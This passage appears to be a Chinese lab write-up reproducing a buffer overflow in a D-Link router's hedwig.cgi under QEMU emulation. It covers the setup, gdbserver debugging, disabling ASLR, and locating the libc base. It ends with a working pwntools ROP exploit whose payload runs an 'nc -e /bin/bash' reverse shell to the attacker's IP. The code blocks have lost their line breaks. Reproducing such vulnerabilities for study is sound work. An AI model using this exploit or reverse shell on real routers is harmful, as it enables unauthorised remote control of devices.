        }
        Specials
        {
            Dump        { /dump }
            CGI            { cgi }
            Imagemap    { map }
            Redirect    { url }
        }
        External
        {
            /usr/sbin/phpcgi { php }
        }
    }
    Server
    {
        ServerName "Linux, HTTP/1.1, "
        ServerId "1234"
        Family inet
        Interface eth0 #对应qemu仿真路由器系统的网卡
        Address 192.168.x.x #qemu仿真路由器系统的IP
        Port "1234" #对应未被使用的端口
        Virtual
        {
            AnyHost
            Control
            {
                Alias /
                Location /htdocs/web
                IndexNames { index.php }
                External
                {
                    /usr/sbin/phpcgi { router_info.xml }
                    /usr/sbin/phpcgi { post_login.xml }
                }
            }
            Control
            {
                Alias /HNAP1
                Location /htdocs/HNAP1
                External
                {
                    /usr/sbin/hnap { hnap }
                }
                IndexNames { index.hnap }
            }
        }
    }
启动qemu仿真路由器系统：
    sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap -nographic
`坑点4：` 此处下载的 `-kernel`和
`-hda`的文件一定要同一个目录下的，并且匹配上的程序的`大小端序`，否则执行会出现!
此内容提示。
2，测试两台主机ping通网络情况
qemu网络配置参考：[家用路由器研究详解入门（内含仿真环境搭建）](https://blog.csdn.net/weixin_44309300/article/details/118526235)
两台主机互通按里面内容配置即可，如想联通外网，可按一把梭方法（硬核联网）。
3，将固件的提取的文件系统(在Ubuntu上)利用scp命令拷贝到mipsel虚拟机中
    sudo scp -r squashfs-root root@192.168.x.x:/root/
[scp命令使用参考](https://www.runoob.com/linux/linux-comm-scp.html)
4，之后编写copy.sh脚本配置启动http服务需要的环境包括动态链接库，以及conf配置文件中提到的`/usr/sbin/phpcgi`，`/usr/sbin/hnap`。
    cp conf /cp sbin/httpd /cp -rf htdocs/ /rm /etc/servicescp -rf etc/ /cp lib/ld-uClibc-0.9.30.1.so  /lib/cp lib/libcrypt-0.9.30.1.so  /lib/cp lib/libc.so.0  /lib/cp lib/libgcc_s.so.1  /lib/cp lib/ld-uClibc.so.0  /lib/cp lib/libcrypt.so.0  /lib/cp lib/libgcc_s.so  /lib/cp lib/libuClibc-0.9.30.1.so  /lib/cd /ln -s /htdocs/cgibin /htdocs/web/hedwig.cgiln -s /htdocs/cgibin /usr/sbin/phpcgiln -s  /htdocs/cgibin /usr/sbin/hnap./httpd -f conf
记得启动执行（需要进入squashfs-root目录使用，脚本最后启动了http服务。）：
`./copy.sh`
5,在浏览器中访问conf文件中配置的`192.168.79.143:1234/hedwig.cgi` 文件内容
5.1访问方式一：
`坑点5：`如果你直接在浏览器中输入以上地址，默认https访问，手动改成http协议即可看见服务被启动。
5.2访问方式二：
在宿主机(ubuntu)中使用以下命令：其中-v显示详细信息，-X指定什么指令，-H 自定义头信息传递给服务器，-b 指定cookie字符串。
    curl http://192.168.79.143:1234/hedwig.cgi -v -X POST -H "Content-Length: 8" -b  "uid=zh"
[curl使用：](https://www.cnblogs.com/duhuo/p/5695256.html)在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。
# gdbserver调试
1，接下来尝试调试`/htdocs/web/hedwig.cgi`文件
返回no
REQUEST，查看IDA静态反汇编得知没有指定环境变量`REQUEST_METHOD`的值（还是怼时间去逆向分析函数功能，如果能通过浏览器找到相关函数功能说明最好了，节约时间）。所以想要触发漏洞进行调试的话，还是需要通过export
设置相关环境变量。
    export CONTENT_LENGTH="100"export CONTENT_TYPE="application/x-www-form-urlencoded"export REQUEST_METHOD="POST"export REQUEST_URI="/hedwig.cgi"export HTTP_COOKIE="uid=1234"
运行成功：
2，接下来动态调试确定偏移但是在那之前需要关掉地址随机化，因为qemu的虚拟机内核开启了地址随机化，每次堆的地址都在变化，导致libc的基地址也不断在变，所以需要关闭地址随机化。
    echo 0 > /proc/sys/kernel/randomize_va_space
3，在qemu仿真路由器系统中，和gdb进行动态调试
目的：验证地址偏移位置。
`qemu仿真路由器系统中`编写调试脚本：
    #!/bin/bashexport CONTENT_LENGTH="100"export CONTENT_TYPE="application/x-www-form-urlencoded"export HTTP_COOKIE="`cat content`" #content你自己构造的数据内容，原本是没有的按上面所述的方式去创建export REQUEST_METHOD="POST"export REQUEST_URI="/hedwig.cgi"echo "uid=1234"|./gdbserver.mipsel 192.168.x.x:9999 /htdocs/web/hedwig.cgi
记得在仿真路由器系统中启动：
`./debug.sh`
接下来启动gdb调试便可确定偏移。（这里gdb调试技能各位同学自己去实践操作吧，本人也在不断熟悉过程中，就不带各位一步一步跟了）
4，接下来是确定libc的基地址，需要先把环境变量配置好，不然/htdocs/web/hedwig.cgi很快就执行完，进程立马就结束了，就得不到maps。
利用（注意根据会先pid规律，快速修改预测pid执行，否则maps地址数据不会出来）
    /htdocs/web/hedwig.cgi & cat /proc/pid/maps
**a &b
先执行a，在执行b，无论a成功与否都会执行b**。因为关闭了地址随机化，libc.so.0的基地址就是0x77f34000。这里的libc.so.0是指向libuClibc-0.9.30.1.so。所以libuClibc-0.9.30.1.so基地址为0x77f34000。
    root@debian-mipsel:~/squashfs-root# export CONTENT_LENGTH="100"root@debian-mipsel:~/squashfs-root# export CONTENT_TYPE="application/x-www-form-urlencoded"root@debian-mipsel:~/squashfs-root# export HTTP_COOKIE="uid=1234"root@debian-mipsel:~/squashfs-root# export REQUEST_METHOD="POST"root@debian-mipsel:~/squashfs-root# export REQUEST_URI="/hedwig.cgi"root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/pid/maps[10] 1052cat: /proc/pid/maps: No such file or directoryroot@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/pid/maps[11] 1054cat: /proc/pid/maps: No such file or directory[10]+  Stopped                 /htdocs/web/hedwig.cgiroot@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/1056/maps [12] 105600400000-0041c000 r-xp 00000000 08:01 32694      /htdocs/cgibin0042c000-0042d000 rw-p 0001c000 08:01 32694      /htdocs/cgibin0042d000-0042f000 rwxp 00000000 00:00 0          [heap]77f34000-77f92000 r-xp 00000000 08:01 547906     /lib/libc.so.077f92000-77fa1000 ---p 00000000 00:00 0 77fa1000-77fa2000 r--p 0005d000 08:01 547906     /lib/libc.so.077fa2000-77fa3000 rw-p 0005e000 08:01 547906     /lib/libc.so.077fa3000-77fa8000 rw-p 00000000 00:00 0 77fa8000-77fd1000 r-xp 00000000 08:01 546761     /lib/libgcc_s.so.177fd1000-77fe1000 ---p 00000000 00:00 0 77fe1000-77fe2000 rw-p 00029000 08:01 546761     /lib/libgcc_s.so.177fe2000-77fe7000 r-xp 00000000 08:01 547907     /lib/ld-uClibc.so.077ff5000-77ff6000 rw-p 00000000 00:00 0 77ff6000-77ff7000 r--p 00004000 08:01 547907     /lib/ld-uClibc.so.077ff7000-77ff8000 rw-p 00005000 08:01 547907     /lib/ld-uClibc.so.07ffd6000-7fff7000 rwxp 00000000 00:00 0          [stack]7fff7000-7fff8000 r-xp 00000000 00:00 0          [vdso][11]+  Stopped                 /htdocs/web/hedwig.cgi
# 编写exp
system方法：将上面的exp的libc基地址和偏移改掉然后cmd换成`nc -e /bin/bash 192.168.x.145
9999`（IP地址是ubuntu机器的，即攻击主机IP）
    #!/usr/bin/python2from pwn import *context.endian = "little"context.arch = "mips"base_addr = 0x77f34000system_addr_1 = 0x53200-1gadget1 = 0x45988gadget2 = 0x159cccmd = 'nc -e /bin/bash 192.168.79.145 9999'padding = 'A' * 973 #1009-4*9padding += p32(base_addr + system_addr_1) # s0padding += p32(base_addr + gadget2)       # s1padding += 'A' * 4                        # s2padding += 'A' * 4                        # s3padding += 'A' * 4                        # s4padding += 'A' * 4                           # s5padding += 'A' * 4                        # s6padding += 'A' * 4                        # s7padding += 'A' * 4                        # fppadding += p32(base_addr + gadget1)       # rapadding += 'B' * 0x10padding += cmdf = open("context",'wb')f.write(padding)f.close()
生成的context通过scp拷贝到mips虚拟机中并且`nano debug.sh`更改debug.sh
`新的debug.sh内容：（在路由器仿真系统执行，即被攻击机）`
    #!/bin/bashexport CONTENT_LENGTH="100"export CONTENT_TYPE="application/x-www-form-urlencoded"export HTTP_COOKIE="uid=`cat context`"export REQUEST_METHOD="POST"export REQUEST_URI="/hedwig.cgi"echo "uid=1234"|/htdocs/web/hedwig.cgi#echo "uid=1234"|./gdbserver.mipsel 192.168.x.145:9999 /htdocs/web/hedwig.cgi
在mips虚拟机运行之后在本机nc -vlp 9999，确实能够获取/bin/bash权限。成功了！说明rop链构造是没问题的。
`最后：`exp当然不止这一种，其他可以利用的方法也许多，由于受限于个人的知识水平，整理难免会出现不正确的地方，如若发现了问题，欢迎指出，笔者也会修改和完善相关内容，继续努力贡献更优质的号文章分享给大家。
# 总结
由于各种原因涉及此行业，也是个人第一个完整复现成功的漏洞，在学习过程中发现许多问题，并且从解决过程中收获许多，正是因为遇到许多奇怪的坑，并且能找的相关资料甚少，所以花了大量时间完成了本文，文中内容尽量做到细节步骤都配图说明，希望能帮助到更多的同学。
`浅聊心态历程：`遇到各种问题被卡住时难免会产生放弃及怀疑的思虑，坚持下来的原因对我而言更多的是热爱，如若不是兴趣趋势，小劝各位同学尽早发现自己喜欢的方向或者职业。
# 参考
1，DIR815缓冲区溢出漏洞分析相关：
[1]
[2]
]
2，环境搭建
[1]
[2]
3，GDB+GDBServer调试Linux应用程序
4，配置文件
[httpd配置文件httpd.conf规则说明和一些基本指令](https://www.cnblogs.com/f-ck-need-u/p/7636836.html)
5，>